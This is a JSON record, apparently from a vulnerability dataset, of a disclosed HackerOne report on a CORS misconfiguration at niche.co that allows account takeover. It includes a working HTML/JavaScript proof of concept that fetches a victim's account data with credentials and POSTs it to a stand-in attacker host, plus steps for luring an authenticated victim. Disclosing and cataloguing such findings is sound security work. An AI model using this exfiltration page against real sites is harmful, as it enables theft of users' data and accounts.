@@ -1,0 +1,38 @@
+{
+    "reported_to": "X (Formerly Twitter)",
+    "reported_by": "nahoragg ",
+    "title": "CORS misconfig | Account Takeover",
+    "content": "\nSummary:\nCORS misconfig is found on niche.co as Access-Control-Allow-Origin is dynamically fetched from client Origin header with credential true and different methods are enabled as well.\nDescription:\nBasically, the application was only checking whether \"//niche.co\" was in the Origin header, that means i can give anything containing that. For ex : \"https://niche.co.evil.net\", \"https://niche.com\", i can even change the protocol like http, ftp, file etc. cors_1.png (F363563): cors_1.png\nSteps To Reproduce:\nExploit:\nHost this code on a domain(http://niche.co.evil.net) or any other that contains \"//niche.co\".\nCode 668 Bytes\n1<html>\n2<body>\n3<button type='button' onclick='cors()'>CORS</button>\n4<p id='demo'></p>\n5<script>\n6function cors() {\n7var xhttp = new XMLHttpRequest();\n8xhttp.onreadystatechange = function() {\n9if (this.readyState == 4 && this.status == 200) {\n10var a = this.responseText; // Sensitive data from niche.co about user account\n11document.getElementById(\"demo\").innerHTML = a;\n12xhttp.open(\"POST\", \"http://evil.cors.com\", true);// Sending that data to Attacker's website\n13xhttp.withCredentials = true;\n14console.log(a);\n15xhttp.send(\"data=\"+a);\n16}\n17};\n18xhttp.open(\"GET\", \"https://www.niche.co/api/v1/users/*******\", true);\n19xhttp.withCredentials = true;\n20xhttp.send();\n21}\n22</script>\n23</body>\n24</html>\nAs soon as victim visit this malicious page, his details will be fetched from his current session and sent to attacker's domain where it can be logged or saved. cors_3.png (F363586): cors_3.png cors_2.png (F363564): cors_2.png\nHow to fix\nRather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.\nSupporting Material/References:\nhttps://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties\nhttps://ejj.io/misconfigured-cors/\nImpact\nUsing this misconfig, attacker can do many actions depending on the functionality of application which in this case use API and do activities like:\n1) Read, Update, Delete Users information(Email,Location,Bio etc)\n2) Stealing Authenticity_token(CSRF)\n3) Delete social accounts on niche\n4) View private posts of social accounts\n5) Close account\n6) Logout etc.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1544484480,
+    "report_url": "https://hackerone.com/reports/426147",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Host a malicious webpage on a domain containing '//niche.co' (e.g., http://niche.co.evil.net) with the provided exploit code."
+        ],
+        [
+            2,
+            "Trick a victim into visiting the malicious page while authenticated to niche.co."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a CORS misconfiguration on niche.co where the Access-Control-Allow-Origin header is dynamically set based on the client's Origin header, allowing any domain containing '//niche.co' to make authenticated requests. This enables an attacker to steal sensitive user data and perform actions on behalf of the victim.",
+    "reason": "The attack involves understanding CORS misconfigurations and crafting a malicious webpage, but the steps are straightforward once the misconfiguration is identified. The interaction between the Origin header and the server's response is a known issue in CORS implementations.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
